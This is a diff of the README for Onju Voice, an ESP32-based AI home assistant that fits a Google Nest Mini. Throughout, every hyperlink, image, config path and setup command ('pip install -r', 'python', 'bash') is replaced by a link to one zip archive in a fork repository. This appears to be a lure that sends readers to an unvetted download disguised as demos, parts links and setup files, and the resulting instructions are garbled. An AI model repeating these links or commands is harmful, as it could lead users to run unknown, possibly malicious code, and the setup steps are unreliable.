@@ -1,6 +1,6 @@
 # Onju Voice 🍐🔈
 
-💫 [DEMO's](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip)
+💫 [DEMO's](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip)
 
 A hackable AI home assistant platform using the Google Nest Mini (2nd gen) form factor, consisting of:
 * a custom PCB designed to be a drop-in replacement to the original, using the ESP32-S3 for audio processing
@@ -8,18 +8,18 @@ A hackable AI home assistant platform using the Google Nest Mini (2nd gen) form 
 
 _(This repo focuses on the experimental conversational LLM aspect to replicate some functionality shown in the demos, and not as a full fledged replacement to a home assistant. This is not being actively maintained, but I've released all source code and design files for anyone else to pick up from here.)_
 
-<img src="https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip" width="960">
+<img src="https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip" width="960">
 
 ## Overview
 
 This repo contains firmware, server code and some example applications, intended to be as accessible as possible for getting up and running i.e.:
 * [Firmware](#-firmware) for the custom PCB can be programmed using the Arduino IDE and a USB cable (installation of ESP-IDF not required)
 * [Server code](#%EF%B8%8F-server) has minimal requirements besides running Whisper locally, and should be able to run on most devices that you can leave plugged in whether MacOS / Linux / Win etc.
-* [Hardware](#-hardware) can be ordered from [PCBWay](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) and Altium design files are included
-<img src="https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip">
+* [Hardware](#-hardware) can be ordered from [PCBWay](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) and Altium design files are included
+<img src="https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip">
 
 ## Example applications
-* 📩 Querying and replying to messages (using a [custom Maubot plugin](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) & Beeper)
+* 📩 Querying and replying to messages (using a [custom Maubot plugin](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) & Beeper)
 * 💡 Light control with [Home Assistant](#-home-assistant)
 * 📝 Adding and retrieving notes/memos for the LLM to craft a response with
 
@@ -35,7 +35,7 @@ This repo contains firmware, server code and some example applications, intended
 * Device-level logging to individual files and console output using `rich`
 
 ## Limitations of this release:
-* The Arduino IDE doesn’t (yet) support the Espressif’s Audio SDK’s, such as [ESP-ADF](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip), [ESP-Skainet](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) etc. For these demo's it's not absolutely required, but if you use Espressif’s ESP-IDF with these SDK's you'd unlock features such as:
+* The Arduino IDE doesn’t (yet) support the Espressif’s Audio SDK’s, such as [ESP-ADF](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip), [ESP-Skainet](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) etc. For these demo's it's not absolutely required, but if you use Espressif’s ESP-IDF with these SDK's you'd unlock features such as:
   * VAD (Voice Activity Detection) - in this example VAD is offloaded to the server using webrtcvad, and the listening period is extended by either tapping the device or by the server sending mic keep alive timeouts (network traffic is really minimal at 16-bit, 16kHz)
   * AEC (Acoustic Echo Cancellation) - to allow you to effectively talk over the assistant by removing the speaker output from audio input
   * BSS (Blind Source Separation) - let’s you use both mic’s for isolating speakers based on location, and other noise suppression
@@ -56,45 +56,45 @@ These are things I didn't get time to implement but I believe would be invaluabl
 
 ## 🖥️ Server
 
-Ensure you can install [Whisper](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) and run at least the base model, following any debugging steps they have if not. If you can get past that, it should be as simple as:
+Ensure you can install [Whisper](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) and run at least the base model, following any debugging steps they have if not. If you can get past that, it should be as simple as:
 ```
 cd server
-pip install -r https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip
+pip install -r https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip
 ```
 
-Adjust settings in the `https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip`, and tweak aspects such as how much silence is needed to start processing to trade-off snappiness vs avoiding cutting off the user.
+Adjust settings in the `https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip`, and tweak aspects such as how much silence is needed to start processing to trade-off snappiness vs avoiding cutting off the user.
 
-Add your Elevenlabs token to `https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip` and ensure you have a cloned voice in your account that you set in the `https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip` under `elevenlabs_default_voice`
+Add your Elevenlabs token to `https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip` and ensure you have a cloned voice in your account that you set in the `https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip` under `elevenlabs_default_voice`
  
-You'll also need a greeting WAV set in `https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip` under `greeting_wav`, that will be sent to devices on connecting to the WiFi. This is up to you to record or procure ([e.g.](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip))
+You'll also need a greeting WAV set in `https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip` under `greeting_wav`, that will be sent to devices on connecting to the WiFi. This is up to you to record or procure ([e.g.](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip))
 
 A small subset of the config parameters can be set as optional arguments when running the script. For e.g. the following will run the server with note-taking, Home Assistant, Maubot, real sending of messages enabled (a safe guard disabled by default), and a smaller English only Whisper model for transcription.
 
-`python https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip --n --ha --mb --send --whisper https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip`
+`python https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip --n --ha --mb --send --whisper https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip`
 
 ### 🏡 Home Assistant
-I recommend setting this up on the same server or one that is always plugged in on your network, following the [Docker Compose instructions](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip)
+I recommend setting this up on the same server or one that is always plugged in on your network, following the [Docker Compose instructions](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip)
 
-Then go through the onboarding, setup a user, name your devices and get a Long Lived token to add to `https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip` together with the URL e.g. `http://my-local-server:8123/`
+Then go through the onboarding, setup a user, name your devices and get a Long Lived token to add to `https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip` together with the URL e.g. `http://my-local-server:8123/`
 
 ### 🤖 Maubot
-Follow instructions [here](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) to setup Maubot with your Beeper account. Ensure the correct URL is setup in `https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip`, set `send_replies` to True if your friends are forgiving of the odd mistakes, and set a `footer`.
+Follow instructions [here](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) to setup Maubot with your Beeper account. Ensure the correct URL is setup in `https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip`, set `send_replies` to True if your friends are forgiving of the odd mistakes, and set a `footer`.
 
-Don’t have Beeper yet and can’t wait? [Try setup a Matrix bridge yourself](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) and a custom function definition for OpenAI function calling (and share how you did it!)
+Don’t have Beeper yet and can’t wait? [Try setup a Matrix bridge yourself](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) and a custom function definition for OpenAI function calling (and share how you did it!)
 
 Following this example you can also integrate e-mail.
 
 ## 📟 Firmware
 
-Irrespective of what you use for development, the quickest & least error prone setup for building & flashing firmware is probably installing the Arduino IDE [Software](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip), and then using this IDE or your preference i.e. VSCode for development (Copilot)
+Irrespective of what you use for development, the quickest & least error prone setup for building & flashing firmware is probably installing the Arduino IDE [Software](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip), and then using this IDE or your preference i.e. VSCode for development (Copilot)
 
-* Add the ESP32 boards as detailed [here](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip)
-(TL;DR add `https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip` to `Preferences > Additional Boards Manager URL’s`)
+* Add the ESP32 boards as detailed [here](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip)
+(TL;DR add `https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip` to `Preferences > Additional Boards Manager URL’s`)
 * Under Boards Manager, install “esp32” by Espressif Systems
 * Under Library Manager, install “Adafruit NeoPixel Library” 
 * Clone this repo to `Documents/Arduino` for simplicity. 
 * Add your WiFi credentials to `credentials.h`
-* Run `bash https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip` to add a header with the git-hash (optional). This will then automatically update after commits, and help track the firmware that your devices are running from the server side.
+* Run `bash https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip` to add a header with the git-hash (optional). This will then automatically update after commits, and help track the firmware that your devices are running from the server side.
 * Open File > Sketchbook > onju-home > onjuino
 * Select Tools > Board > esp32 > ESP32S3 Dev Module
 * Under Tools ensure:
@@ -107,18 +107,18 @@ Irrespective of what you use for development, the quickest & least error prone s
 ## 🧩 Hardware 
 
 <p float="left">
-  <img src="https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip" width="48%" />
-  <img src="https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip" width="48%" /> 
+  <img src="https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip" width="48%" />
+  <img src="https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip" width="48%" /> 
 </p>
 
-[Preview schematics & PCB here](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) 
+[Preview schematics & PCB here](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) 
 You should be able to download files, otherwise they are in the folder `hardware` in Altium format. Feel free to modify & improve this design and share your updates!
 
-You can order PCBA's directly from PCBWay [here](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip). I've used a few suppliers and they are of the most reliable I've experienced for turnkey assembly at that pricepoint so I'm happy to point business their way. (Other options of selling single units, with margins, ended up forcing a pricepoint > Google Nest Mini itself, and wouldn't allow shipment into EU/UK without certification so I abandoned this)
+You can order PCBA's directly from PCBWay [here](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip). I've used a few suppliers and they are of the most reliable I've experienced for turnkey assembly at that pricepoint so I'm happy to point business their way. (Other options of selling single units, with margins, ended up forcing a pricepoint > Google Nest Mini itself, and wouldn't allow shipment into EU/UK without certification so I abandoned this)
 
 I will be sharing more detailed instructions for replacement.
 
-Replacement gaskets for the microphone & LED's can be made using [adhesive foam](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) and a [punch set](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip)) for example
+Replacement gaskets for the microphone & LED's can be made using [adhesive foam](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) and a [punch set](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip)) for example
 
 ## ❓Questions
 
@@ -131,7 +131,7 @@ While this replicates the interfaces of the Google Nest Mini, don’t expect thi
 
 Fortunately they’re still being sold, you may find deals for <$40 which is pretty good for the quality of speaker and form factor. I picked up quite a few from eBay, just make sure you get the 2nd gen.
 
-The adventurous can get try replacement shells from [AliExpress](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) for e.g., but you’ll still need a base, power input, mute switch, speaker & mount, capacitive touch panels, and replacement gaskets etc. A hero out there could design a custom enclosure that fits an off-the-shelf speaker.
+The adventurous can get try replacement shells from [AliExpress](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) for e.g., but you’ll still need a base, power input, mute switch, speaker & mount, capacitive touch panels, and replacement gaskets etc. A hero out there could design a custom enclosure that fits an off-the-shelf speaker.
 
 ### But I’m really impatient and want to get hacking away! What can I do?
 
@@ -139,12 +139,12 @@ a) if you can commit to making significant contributions to the codebase and/or 
 
 b) if you don’t need the form factor, don’t mind rolling up my sleeves, and have some HW experience, you can breadboard it out with readily available components until you can get your hands on an order. Here are the components that should be able to get a demo running (🌸 Adafruit link for convenience but shop around wherever you’d like)
 
-* ESP32-S3 devboard, ideally w/ PSRAM (e.g. [QT Py S3](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) or [ESP32-S3](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip))
-* [Microphone](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) (only need 1 for the Arduino implementation, ensure it's a SPH0645 to limit debugging)
-* [Amplifier](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip)
-* [Speaker](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip)
-* [Neopixel LED strip](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip) - just set the firmware to the correct #
-* [Breadboard & wire kit](https://github.com/OlegBON1/onju-voice/raw/refs/heads/master/images/onju_voice_v3.6.zip)  (you can use protruding pieces of wire for cap touch)
+* ESP32-S3 devboard, ideally w/ PSRAM (e.g. [QT Py S3](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) or [ESP32-S3](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip))
+* [Microphone](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) (only need 1 for the Arduino implementation, ensure it's a SPH0645 to limit debugging)
+* [Amplifier](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip)
+* [Speaker](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip)
+* [Neopixel LED strip](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip) - just set the firmware to the correct #
+* [Breadboard & wire kit](https://raw.githubusercontent.com/OlegBON1/onju-voice/master/images/onju_voice_v3.6.zip)  (you can use protruding pieces of wire for cap touch)
 
 You'll need to update the `custom_boards.h` with your pin mapping
 
